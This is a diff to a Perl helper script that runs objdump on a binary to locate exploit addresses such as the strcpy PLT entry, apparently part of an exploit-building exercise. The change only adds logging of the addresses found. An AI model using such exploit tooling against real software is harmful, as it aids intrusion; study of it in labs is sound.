@@ -1,11 +1,16 @@
 #!/usr/bin/env perl
 
+sub info {printf STDERR @_}
+
 sub get_addr {
 	my ($binary,$flags,$regex) = @_;
 	open OBJDUMP, "objdump $flags $binary |" or die $!;
 	while (<OBJDUMP>) {
 		/^\s*([0-9a-f]+):?\s*$regex/ or next;
-		close OBJDUMP; return eval "0x$1";
+		close OBJDUMP;
+		my $addr = eval "0x$1";
+		info "Address for $regex: 0x%08x\n", $addr;
+		return $addr;
 	}
 	die "No address found for $regex in 'objdump $flags $binary'.\n";
 }
@@ -19,10 +24,13 @@ prompt: print TTY "Enter the correct address: ";
 	my $addr = <TTY>;
 	$addr =~ /^\s*(?:0x)?([0-9a-f]+):?(?!\S)/ or
 	print TTY "Not a valid address.\n" and goto prompt;
-	close TTY; return eval "0x$1";
+	close TTY;
+	my $addr = eval "0x$1";
+	info "Address for $regex: 0x%08x\n", $addr;
+	return $addr;
 }
 
-warn "Automatically finding exploit addresses...\n";
+info "Automatically finding exploit addresses...\n";
 
 $binary = shift or die "usage: $0 <binary> [offset before target]\n";
 $strcpy = get_addr $binary, -d => qr/.*<strcpy\@plt>/;
